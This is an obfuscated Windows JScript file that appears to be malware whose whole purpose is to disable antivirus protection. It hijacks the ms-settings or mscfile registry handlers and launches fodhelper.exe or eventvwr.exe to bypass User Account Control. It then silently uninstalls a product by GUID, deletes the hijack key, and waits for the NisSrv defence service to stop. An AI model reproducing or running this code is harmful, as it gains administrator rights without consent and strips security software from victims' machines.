function pmbskuecyftru(name) {
  var shfebaomwlx = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_Service WHERE Name='" + name + "'");
  utlxfzud = new Enumerator(shfebaomwlx);
  bqijutotpzpmc = utlxfzud.item();
  var htugfg = '';
  try {
    htugfg = bqijutotpzpmc.State;
  } catch (e) {}
  if (htugfg == 'Running') {
    return true;
  } else {
    return false;
  }
}
tdlfiqbhtqlk = 'NisSrv';
var sxwvah = WScript.CreateObject("shell.application");
var siwbezkij = new ActiveXObject("WScript.Shell");
var fufajgarmx = GetObject("winmgmts:\\\\.\\root\\CIMV2");
var lsiicx = fufajgarmx.ExecQuery("SELECT * FROM Win32_OperatingSystem", "WQL", 0x10 | 0x20);
var zynhqkeg = new Enumerator(lsiicx);
var iaibbfhyncgmgt = zynhqkeg.item();
var vjcrmmpy = iaibbfhyncgmgt.SystemDirectory;
var nimlctvre = iaibbfhyncgmgt.Version;
var arr = nimlctvre.split(".");
if (arr[0] == '10') {
  siwbezkij.RegWrite("HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\",
    'MsiExec.exe /X{2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet',
    "REG_SZ");
  siwbezkij.RegWrite("HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute", "", "REG_SZ");
  sxwvah.ShellExecute("explorer.exe", '"' + vjcrmmpy + '\\fodhelper.exe"', "", "open", 0);
  WScript.sleep(10000);
  siwbezkij.RegDelete("HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\");
} else {
  if (arr[0] == '6') {
    siwbezkij.RegWrite("HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\",
      'MsiExec.exe /X {2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet',
      "REG_SZ");
    sxwvah.ShellExecute("explorer.exe", '"' + vjcrmmpy + '\\eventvwr.exe"', "", "open", 0);
    WScript.sleep(10000);
    siwbezkij.RegDelete("HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\");
  }
}
var iii = 0;
while (true) {
  if (pmbskuecyftru(tdlfiqbhtqlk)) {
    WScript.sleep(100);
  } else {
    break;
  }
  iii = iii + 1;
  if (iii == 900) {
    break;
  }
}
